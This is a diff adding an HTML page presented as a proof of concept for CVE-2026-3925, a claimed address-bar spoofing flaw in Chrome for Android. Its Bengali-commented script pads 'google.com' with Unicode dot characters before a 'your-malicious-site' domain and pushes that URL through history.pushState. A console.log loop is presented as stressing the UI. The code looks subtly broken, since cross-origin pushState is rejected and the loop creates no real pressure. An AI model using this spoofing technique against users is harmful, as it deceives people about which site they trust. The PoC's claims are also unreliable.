@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC CVE-2026-3925 Research</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .warning { color: red; font-weight: bold; }
+        button { padding: 15px 25px; font-size: 18px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Security Research: UI Spoofing</h1>
+    <p class="warning">Target: Vulnerable Chrome for Android (< v146.0.7680.71)</p>
+    
+    <p>Click the button below to test Lookalike UI behavior:</p>
+    <button onclick="triggerSpoof()">Test Vulnerability</button>
+
+    <script>
+        function triggerSpoof() {
+            // ১. খুব লম্বা একটি স্ট্রিং ব্যবহার করে আসল ডোমেইনকে আড়াল করার চেষ্টা (URL Padding)
+            // ২. কিছু বিশেষ ইউনিকোড ক্যারেক্টার ব্যবহার যা LookalikeChecks ফিল্টার মিস করতে পারে
+            const spoofedPart = "google.com" + "\u2024".repeat(50) + "your-malicious-site.github.io";
+            
+            // ৩. হিস্ট্রি ম্যানিপুলেশন বা পুশ স্টেট ব্যবহার
+            window.history.pushState({}, "", "https://" + spoofedPart);
+            
+            alert("Check your Address Bar! \nDoes it show 'google.com' prominently?");
+            
+            // ৪. অতিরিক্ত রেন্ডারিং প্রেশার তৈরি করা যাতে UI চেক স্কিপ হয়
+            for(let i=0; i<100; i++) {
+                console.log("Stressing UI...");
+            }
+        }
+    </script>
+</body>
+</html>
